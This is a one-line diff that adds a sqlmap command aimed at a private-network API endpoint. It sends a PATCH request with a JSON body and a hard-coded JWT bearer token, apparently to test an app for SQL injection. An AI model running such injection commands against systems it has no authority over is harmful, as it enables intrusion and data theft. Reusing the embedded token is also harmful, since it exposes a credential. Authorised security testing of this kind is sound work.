@@ -1,0 +1,1 @@
+sqlmap -u "http://192.168.1" --method PATCH --data "{\"nombre\": \"Plan Hack\", \"subtitulo\": \"Test\"}" --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidmVyIjowLCJpc3MiOiJjb3RpLW1lbm9yIiwiYXVkIjoiY290aS1tZW5vci1hcHAiLCJpYXQiOjE3OTI2NzY0NTcsImV4cCI6MTc5MjcwNTI1N30.tEddy0X1pKUVmRC1w1bNDOb-3yP7EGZ_cqQgSvBsOh0" --batch --banner
